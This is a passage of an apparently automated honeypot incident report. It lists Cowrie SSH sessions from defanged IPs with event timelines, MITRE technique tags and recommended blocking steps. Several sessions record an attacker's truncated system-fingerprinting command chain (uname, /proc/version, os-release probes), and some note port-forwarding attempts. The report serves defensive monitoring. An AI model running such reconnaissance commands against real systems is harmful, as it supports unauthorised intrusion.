| `2026-07-15 05:23:10` | `cowrie.command.input` |
| `2026-07-15 05:23:10` | `cowrie.command.input` |
| `2026-07-15 05:23:10` | `cowrie.command.input` |
| `2026-07-15 05:23:10` | `cowrie.command.success` |
| `2026-07-15 05:23:10` | `cowrie.command.input` |
| `2026-07-15 05:23:10` | `cowrie.command.input` |
| `2026-07-15 05:23:10` | `cowrie.command.input` |
| `2026-07-15 05:23:10` | `cowrie.command.input` |
| `2026-07-15 05:23:10` | `cowrie.log.closed` |
| `2026-07-15 05:23:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c76dee18ab4

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:25 |
| **Last Seen** | 2026-07-15 05:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:25:47` | `cowrie.session.connect` |
| `2026-07-15 05:25:48` | `cowrie.client.version` |
| `2026-07-15 05:25:48` | `cowrie.client.kex` |
| `2026-07-15 05:25:50` | `cowrie.login.success` |
| `2026-07-15 05:25:51` | `cowrie.session.params` |
| `2026-07-15 05:25:51` | `cowrie.command.input` |
| `2026-07-15 05:25:51` | `cowrie.command.input` |
| `2026-07-15 05:25:51` | `cowrie.command.input` |
| `2026-07-15 05:25:51` | `cowrie.command.input` |
| `2026-07-15 05:25:51` | `cowrie.command.input` |
| `2026-07-15 05:25:51` | `cowrie.command.success` |
| `2026-07-15 05:25:51` | `cowrie.command.input` |
| `2026-07-15 05:25:51` | `cowrie.command.input` |
| `2026-07-15 05:25:51` | `cowrie.command.input` |
| `2026-07-15 05:25:51` | `cowrie.command.input` |
| `2026-07-15 05:25:52` | `cowrie.log.closed` |
| `2026-07-15 05:25:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaae8bb00fee

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:28 |
| **Last Seen** | 2026-07-15 05:29 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:28:56` | `cowrie.session.connect` |
| `2026-07-15 05:28:56` | `cowrie.client.version` |
| `2026-07-15 05:28:56` | `cowrie.client.kex` |
| `2026-07-15 05:28:59` | `cowrie.login.success` |
| `2026-07-15 05:29:02` | `cowrie.session.params` |
| `2026-07-15 05:29:02` | `cowrie.command.input` |
| `2026-07-15 05:29:02` | `cowrie.command.input` |
| `2026-07-15 05:29:02` | `cowrie.command.input` |
| `2026-07-15 05:29:02` | `cowrie.command.input` |
| `2026-07-15 05:29:02` | `cowrie.command.input` |
| `2026-07-15 05:29:02` | `cowrie.command.success` |
| `2026-07-15 05:29:02` | `cowrie.command.input` |
| `2026-07-15 05:29:02` | `cowrie.command.input` |
| `2026-07-15 05:29:02` | `cowrie.command.input` |
| `2026-07-15 05:29:02` | `cowrie.command.input` |
| `2026-07-15 05:29:03` | `cowrie.log.closed` |
| `2026-07-15 05:29:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50dc82320441

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:32 |
| **Last Seen** | 2026-07-15 05:32 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:32:11` | `cowrie.session.connect` |
| `2026-07-15 05:32:13` | `cowrie.client.version` |
| `2026-07-15 05:32:13` | `cowrie.client.kex` |
| `2026-07-15 05:32:19` | `cowrie.login.success` |
| `2026-07-15 05:32:22` | `cowrie.session.params` |
| `2026-07-15 05:32:22` | `cowrie.command.input` |
| `2026-07-15 05:32:22` | `cowrie.command.input` |
| `2026-07-15 05:32:22` | `cowrie.command.input` |
| `2026-07-15 05:32:22` | `cowrie.command.input` |
| `2026-07-15 05:32:22` | `cowrie.command.input` |
| `2026-07-15 05:32:22` | `cowrie.command.success` |
| `2026-07-15 05:32:22` | `cowrie.command.input` |
| `2026-07-15 05:32:22` | `cowrie.command.input` |
| `2026-07-15 05:32:22` | `cowrie.command.input` |
| `2026-07-15 05:32:22` | `cowrie.command.input` |
| `2026-07-15 05:32:24` | `cowrie.log.closed` |
| `2026-07-15 05:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c6ce6868d67

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-15 05:33 |
| **Last Seen** | 2026-07-15 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:33:49` | `cowrie.session.connect` |
| `2026-07-15 05:33:49` | `cowrie.client.version` |
| `2026-07-15 05:33:49` | `cowrie.client.kex` |
| `2026-07-15 05:33:49` | `cowrie.login.success` |
| `2026-07-15 05:33:50` | `cowrie.session.params` |
| `2026-07-15 05:33:50` | `cowrie.command.input` |
| `2026-07-15 05:33:50` | `cowrie.log.closed` |
| `2026-07-15 05:33:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-290c1c096299

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:35 |
| **Last Seen** | 2026-07-15 05:36 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:35:38` | `cowrie.session.connect` |
| `2026-07-15 05:35:40` | `cowrie.client.version` |
| `2026-07-15 05:35:40` | `cowrie.client.kex` |
| `2026-07-15 05:35:51` | `cowrie.login.success` |
| `2026-07-15 05:35:57` | `cowrie.session.params` |
| `2026-07-15 05:35:57` | `cowrie.command.input` |
| `2026-07-15 05:35:57` | `cowrie.command.input` |
| `2026-07-15 05:35:57` | `cowrie.command.input` |
| `2026-07-15 05:35:57` | `cowrie.command.input` |
| `2026-07-15 05:35:57` | `cowrie.command.input` |
| `2026-07-15 05:35:57` | `cowrie.command.success` |
| `2026-07-15 05:35:57` | `cowrie.command.input` |
| `2026-07-15 05:35:57` | `cowrie.command.input` |
| `2026-07-15 05:35:57` | `cowrie.command.input` |
| `2026-07-15 05:35:57` | `cowrie.command.input` |
| `2026-07-15 05:36:00` | `cowrie.log.closed` |
| `2026-07-15 05:36:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b48aabe2a630

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:38 |
| **Last Seen** | 2026-07-15 05:38 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:38:30` | `cowrie.session.connect` |
| `2026-07-15 05:38:32` | `cowrie.client.version` |
| `2026-07-15 05:38:32` | `cowrie.client.kex` |
| `2026-07-15 05:38:36` | `cowrie.login.success` |
| `2026-07-15 05:38:39` | `cowrie.session.params` |
| `2026-07-15 05:38:39` | `cowrie.command.input` |
| `2026-07-15 05:38:39` | `cowrie.command.input` |
| `2026-07-15 05:38:39` | `cowrie.command.input` |
| `2026-07-15 05:38:39` | `cowrie.command.input` |
| `2026-07-15 05:38:39` | `cowrie.command.input` |
| `2026-07-15 05:38:39` | `cowrie.command.success` |
| `2026-07-15 05:38:39` | `cowrie.command.input` |
| `2026-07-15 05:38:39` | `cowrie.command.input` |
| `2026-07-15 05:38:39` | `cowrie.command.input` |
| `2026-07-15 05:38:39` | `cowrie.command.input` |
| `2026-07-15 05:38:41` | `cowrie.log.closed` |
| `2026-07-15 05:38:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e908a923d743

| Field | Detail |
|---|---|
| **Source IP** | `161.132.47[.]68` |
| **First Seen** | 2026-07-15 05:40 |
| **Last Seen** | 2026-07-15 05:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:40:49` | `cowrie.session.connect` |
| `2026-07-15 05:40:49` | `cowrie.telnet.option` |
| `2026-07-15 05:40:50` | `cowrie.telnet.option` |
| `2026-07-15 05:41:50` | `cowrie.login.success` |
| `2026-07-15 05:41:50` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `161.132.47[.]68` to AbuseIPDB if not already reported
- [ ] Block `161.132.47[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce0beb8bc775

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:41 |
| **Last Seen** | 2026-07-15 05:41 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:41:01` | `cowrie.session.connect` |
| `2026-07-15 05:41:03` | `cowrie.client.version` |
| `2026-07-15 05:41:03` | `cowrie.client.kex` |
| `2026-07-15 05:41:11` | `cowrie.login.success` |
| `2026-07-15 05:41:16` | `cowrie.session.params` |
| `2026-07-15 05:41:16` | `cowrie.command.input` |
| `2026-07-15 05:41:16` | `cowrie.command.input` |
| `2026-07-15 05:41:16` | `cowrie.command.input` |
| `2026-07-15 05:41:16` | `cowrie.command.input` |
| `2026-07-15 05:41:16` | `cowrie.command.input` |
| `2026-07-15 05:41:16` | `cowrie.command.success` |
| `2026-07-15 05:41:16` | `cowrie.command.input` |
| `2026-07-15 05:41:16` | `cowrie.command.input` |
| `2026-07-15 05:41:16` | `cowrie.command.input` |
| `2026-07-15 05:41:16` | `cowrie.command.input` |
| `2026-07-15 05:41:19` | `cowrie.log.closed` |
| `2026-07-15 05:41:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f59f40b5b26a

| Field | Detail |
|---|---|
| **Source IP** | `222.139.245[.]137` |
| **First Seen** | 2026-07-15 05:42 |
| **Last Seen** | 2026-07-15 05:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:42:51` | `cowrie.session.connect` |
| `2026-07-15 05:42:51` | `cowrie.client.version` |
| `2026-07-15 05:42:51` | `cowrie.client.kex` |
| `2026-07-15 05:42:53` | `cowrie.login.success` |
| `2026-07-15 05:42:54` | `cowrie.direct-tcpip.request` |
| `2026-07-15 05:42:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.139.245[.]137` to AbuseIPDB if not already reported
- [ ] Block `222.139.245[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34798ca85fc5

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:43 |
| **Last Seen** | 2026-07-15 05:43 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:43:32` | `cowrie.session.connect` |
| `2026-07-15 05:43:34` | `cowrie.client.version` |
| `2026-07-15 05:43:34` | `cowrie.client.kex` |
| `2026-07-15 05:43:42` | `cowrie.login.success` |
| `2026-07-15 05:43:47` | `cowrie.session.params` |
| `2026-07-15 05:43:47` | `cowrie.command.input` |
| `2026-07-15 05:43:47` | `cowrie.command.input` |
| `2026-07-15 05:43:47` | `cowrie.command.input` |
| `2026-07-15 05:43:47` | `cowrie.command.input` |
| `2026-07-15 05:43:47` | `cowrie.command.input` |
| `2026-07-15 05:43:47` | `cowrie.command.success` |
| `2026-07-15 05:43:47` | `cowrie.command.input` |
| `2026-07-15 05:43:47` | `cowrie.command.input` |
| `2026-07-15 05:43:47` | `cowrie.command.input` |
| `2026-07-15 05:43:47` | `cowrie.command.input` |
| `2026-07-15 05:43:49` | `cowrie.log.closed` |
| `2026-07-15 05:43:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6feae58c524

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:46 |
| **Last Seen** | 2026-07-15 05:46 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:46:03` | `cowrie.session.connect` |
| `2026-07-15 05:46:05` | `cowrie.client.version` |
| `2026-07-15 05:46:05` | `cowrie.client.kex` |
| `2026-07-15 05:46:12` | `cowrie.login.success` |
| `2026-07-15 05:46:17` | `cowrie.session.params` |
| `2026-07-15 05:46:17` | `cowrie.command.input` |
| `2026-07-15 05:46:17` | `cowrie.command.input` |
| `2026-07-15 05:46:17` | `cowrie.command.input` |
| `2026-07-15 05:46:17` | `cowrie.command.input` |
| `2026-07-15 05:46:17` | `cowrie.command.input` |
| `2026-07-15 05:46:17` | `cowrie.command.success` |
| `2026-07-15 05:46:17` | `cowrie.command.input` |
| `2026-07-15 05:46:17` | `cowrie.command.input` |
| `2026-07-15 05:46:17` | `cowrie.command.input` |
| `2026-07-15 05:46:17` | `cowrie.command.input` |
| `2026-07-15 05:46:19` | `cowrie.log.closed` |
| `2026-07-15 05:46:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-727065f03343

| Field | Detail |
|---|---|
| **Source IP** | `41.214.10[.]178` |
| **First Seen** | 2026-07-15 05:48 |
| **Last Seen** | 2026-07-15 05:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:48:29` | `cowrie.session.connect` |
| `2026-07-15 05:48:30` | `cowrie.client.version` |
| `2026-07-15 05:48:30` | `cowrie.client.kex` |
| `2026-07-15 05:48:31` | `cowrie.login.success` |
| `2026-07-15 05:48:31` | `cowrie.direct-tcpip.request` |
| `2026-07-15 05:48:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.214.10[.]178` to AbuseIPDB if not already reported
- [ ] Block `41.214.10[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97e4674e99b9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:51 |
| **Last Seen** | 2026-07-15 05:51 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:51:01` | `cowrie.session.connect` |
| `2026-07-15 05:51:03` | `cowrie.client.version` |
| `2026-07-15 05:51:03` | `cowrie.client.kex` |
| `2026-07-15 05:51:11` | `cowrie.login.success` |
| `2026-07-15 05:51:20` | `cowrie.session.params` |
| `2026-07-15 05:51:20` | `cowrie.command.input` |
| `2026-07-15 05:51:20` | `cowrie.command.input` |
| `2026-07-15 05:51:20` | `cowrie.command.input` |
| `2026-07-15 05:51:20` | `cowrie.command.input` |
| `2026-07-15 05:51:20` | `cowrie.command.input` |
| `2026-07-15 05:51:20` | `cowrie.command.success` |
| `2026-07-15 05:51:20` | `cowrie.command.input` |
| `2026-07-15 05:51:20` | `cowrie.command.input` |
| `2026-07-15 05:51:20` | `cowrie.command.input` |
| `2026-07-15 05:51:20` | `cowrie.command.input` |
| `2026-07-15 05:51:22` | `cowrie.log.closed` |
| `2026-07-15 05:51:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f6073203a8c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:53 |
| **Last Seen** | 2026-07-15 05:53 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:53:27` | `cowrie.session.connect` |
| `2026-07-15 05:53:28` | `cowrie.client.version` |
| `2026-07-15 05:53:28` | `cowrie.client.kex` |
| `2026-07-15 05:53:33` | `cowrie.login.success` |
| `2026-07-15 05:53:37` | `cowrie.session.params` |
| `2026-07-15 05:53:37` | `cowrie.command.input` |
| `2026-07-15 05:53:37` | `cowrie.command.input` |
| `2026-07-15 05:53:37` | `cowrie.command.input` |
| `2026-07-15 05:53:37` | `cowrie.command.input` |
| `2026-07-15 05:53:37` | `cowrie.command.input` |
| `2026-07-15 05:53:37` | `cowrie.command.success` |
| `2026-07-15 05:53:37` | `cowrie.command.input` |
| `2026-07-15 05:53:37` | `cowrie.command.input` |
| `2026-07-15 05:53:37` | `cowrie.command.input` |
| `2026-07-15 05:53:37` | `cowrie.command.input` |
| `2026-07-15 05:53:39` | `cowrie.log.closed` |
| `2026-07-15 05:53:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

